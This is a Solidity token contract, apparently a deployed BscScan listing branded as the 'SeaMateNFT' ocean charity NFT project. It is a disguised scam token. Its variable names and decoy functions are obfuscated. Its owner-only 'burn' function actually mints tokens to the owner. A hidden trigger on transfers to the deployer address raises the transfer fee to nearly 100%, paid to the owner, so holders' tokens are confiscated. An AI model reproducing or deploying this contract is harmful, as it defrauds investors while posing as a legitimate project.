/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

/*
 AptosMove
Sea Mate - Move To APTOS
SeaMateNFT
A collection of 9999 cute sea creatures here to Save the Ocean. 
� #SeaMateNFT Created by Emilsmsurf
� https://twitter.com/SeaMateNFT
✅ https://linktr.ee/seamatenft
✅ https://discord.com/invite/QETgMS9XeG
*/


// SPDX-License-Identifier: MIT
pragma solidity =0.5.6;
contract MateNFT {
uint256 public constant HGESFD = 99999;
uint256 private  OIUBYA = 1;
address private  BORKIP = address(0);
uint256 private  TGXFQH = 2;
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  MMEQSN = 3;
uint256 private  AWVTME = 4;
address private  NADZZV = address(0);
uint256 private  JHIOTS = 1000000000000000000;
uint256 private  BFWNZB = 5;
address private  XELSDO = address(0);
string public  name = "MateNFT";
address private  TOTAVY = address(0);
uint256 private  FJIFGN = 6;
uint256 public constant totalSupply = 10000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "MateNFT";
mapping (address => uint256) public balanceOf;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  KIOGOE = address(0);
function _getKIOGOE() private returns (address) {
return KIOGOE;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getFJIFGN() private returns (uint256) {
return FJIFGN+4;
}

function _getOIUBYA() private returns (uint256) {
return OIUBYA+9;
}

constructor () public {
NADZZV = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getXELSDO() private returns (address) {
return XELSDO;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tHGHLVH 0");
require(spender != address(0), "fHGHLVH 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getAWVTME() private returns (uint256) {
return AWVTME+6;
}

function _getMMEQSN() private returns (uint256) {
return MMEQSN+7;
}

function _getTOTAVY() private returns (address) {
return TOTAVY;
}

function _getBORKIP() private returns (address) {
return BORKIP;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "HGHLVH");
require(to != address(0), "HGHLVH");
require(amount <= balanceOf[from], "HGHLVH");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HGESFD/JHIOTS ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==NADZZV){
JHIOTS = HGESFD+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getBFWNZB() private returns (uint256) {
return BFWNZB+5;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getTGXFQH() private returns (uint256) {
return TGXFQH+8;
}


}